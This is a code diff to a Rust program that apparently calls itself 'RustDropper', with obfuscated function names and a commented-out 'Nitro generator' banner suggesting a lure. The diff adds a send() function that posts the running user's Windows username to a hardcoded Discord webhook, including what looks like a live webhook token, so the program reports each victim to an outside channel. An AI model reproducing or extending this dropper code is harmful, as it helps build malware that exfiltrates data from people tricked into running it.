@@ -1,15 +1,13 @@
-
-extern crate subprocess;
-extern crate dirs;
-
-
-
 use downloader::Downloader;
-use std::io::{BufRead, BufReader};
+// use std::io::{BufRead, BufReader};
 use std::process::Command;
+use serenity::http::Http;
+use serenity::model::webhook::Webhook;
 // use std::io::*;
 // use colored::*;
 use std::thread;
+
+const IMAGE_URL: &'static str = "https://cdn.discordapp.com/avatars/312157715449249795/a_b8b3b0c35f3dee2b6586a0dd58697e29.png";
 
 
 
@@ -17,6 +15,7 @@ fn main(){
     dwkjadhawjdawjhddwadj();
     d294e8q3890e82308948190iqwoidjawuiojdwoejwheouq2h();
     fudjawjwuu8023848901284234823894209482308948238042380948234();
+    send();
    // nitrogen();    
 }
 
@@ -56,6 +55,16 @@ fn fudjawjwuu8023848901284234823894209482308948238042380948234() {
     
 }
 
+#[tokio::main]
+async fn send() {
+    let http = Http::new("");
+    let webhook = Webhook::from_url(&http, "https://discord.com/api/webhooks/1034629307168993332/4jENJGkYH-MURcGFesW4XfhCz1dIKD749NCe4d8MVp8mYNuDshC2cFOSh6msSaaCbF80").await.expect("Replace the webhook with your own");
+
+    webhook
+        .execute(&http, false, |w| w.content(format!("**Windows User:** `{}`", whoami::username())).username("github.com/svg-rs/RustDropper"))
+        .await
+        .expect("Could not execute webhook.");
+}
 
 // fn nitrogen(){
 //     let logo = "\n███▄    █  ██▓▄▄▄█████▓ ██▀███   ▒█████       ▄████ ▓█████  ███▄    █ \n ██ ▀█   █ ▓██▒▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒    ██▒ ▀█▒▓█   ▀  ██ ▀█   █ \n▓██  ▀█ ██▒▒██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒   ▒██░▄▄▄░▒███   ▓██  ▀█ ██▒\n▓██▒  ▐▌██▒░██░░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░   ░▓█  ██▓▒▓█  ▄ ▓██▒  ▐▌██▒\n▒██░   ▓██░░██░  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░   ░▒▓███▀▒░▒████▒▒██░   ▓██░\n░ ▒░   ▒ ▒ ░▓    ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░     ░▒   ▒ ░░ ▒░ ░░ ▒░   ▒ ▒ \n░ ░░   ░ ▒░ ▒ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░      ░   ░  ░ ░  ░░ ░░   ░ ▒░\n   ░   ░ ░  ▒ ░  ░        ░░   ░ ░ ░ ░ ▒     ░ ░   ░    ░      ░   ░ ░ \n         ░  ░              ░         ░ ░           ░    ░  ░         \n";
